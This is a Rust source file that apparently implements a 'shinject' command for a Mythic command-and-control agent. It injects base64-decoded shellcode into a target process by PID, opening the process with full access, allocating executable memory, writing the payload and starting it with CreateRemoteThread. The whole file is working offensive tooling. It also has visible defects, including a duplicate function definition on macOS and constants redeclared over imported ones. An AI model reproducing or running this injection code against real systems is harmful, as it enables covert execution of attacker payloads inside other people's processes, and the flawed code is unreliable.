use std::mem;
use std::ptr;
use serde::{Deserialize, Serialize};

#[cfg(target_os = "windows")]
use winapi::um::winnt::*;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::*;
#[cfg(target_os = "windows")]
use winapi::shared::ntdef::*;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ShinjectArgs {
    pub shellcode: String,  // File ID from Mythic
    pub process_id: u32,
}

#[cfg(target_os = "windows")]
#[derive(Serialize)]
pub struct ShinjectResult {
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
}

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;

// Main command execution function
#[cfg(target_os = "windows")]
pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
    // This function would need access to your Mythic RPC functions to download the file
    // For now, we'll assume the shellcode is passed as base64 or we have a way to get it
    
    // In a real implementation, you would:
    // 1. Download the shellcode file from Mythic using the file_id
    // 2. Decode it from base64 if necessary
    // 3. Inject it into the target process
    
    // Since we don't have the file download mechanism in this example,
    // we'll assume the shellcode is provided as base64 in the args
    // In reality, you'd use your agent's file download functionality
    
    let shellcode_bytes = match base64::decode(&args.shellcode) {
        Ok(bytes) => bytes,
        Err(_) => {
            // If it's not base64, try to use it as raw file content
            // In practice, you'd download the file from Mythic
            return Err("Shellcode must be base64 encoded or file download must be implemented".to_string());
        }
    };
    
    unsafe {
        match inject_shellcode(args.process_id, &shellcode_bytes) {
            Ok(output) => Ok(output),
            Err(e) => Err(e),
        }
    }
}

#[cfg(target_os = "windows")]
unsafe fn inject_shellcode(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        return Err(format!("Failed to open process with PID: {}. Error: {}", 
            process_id, GetLastError()));
    }

    let buffer_size = shellcode.len();
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err("VirtualAllocEx failed".to_string());
    }

    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        CloseHandle(h_process);
        return Err(format!("WriteProcessMemory failed. Written: {}/{} bytes. Error: {}", 
            bytes_written, buffer_size, GetLastError()));
    }

    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err("CreateRemoteThread failed".to_string());
    }

    let wait_result = WaitForSingleObject(h_thread, INFINITE);
    
    // Clean up
    CloseHandle(h_thread);
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!("Shellcode successfully injected into PID {}. Thread ID: {}", 
            process_id, thread_id))
    } else {
        Err(format!("WaitForSingleObject failed with result: {}", wait_result))
    }
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
    Err("shinject command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
    Err("shinject command is only supported on Windows".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let args = ShinjectArgs {
            shellcode: "test_file_id".to_string(),
            process_id: 1234,
        };
        assert_eq!(args.shellcode, "test_file_id");
        assert_eq!(args.process_id, 1234);
    }
}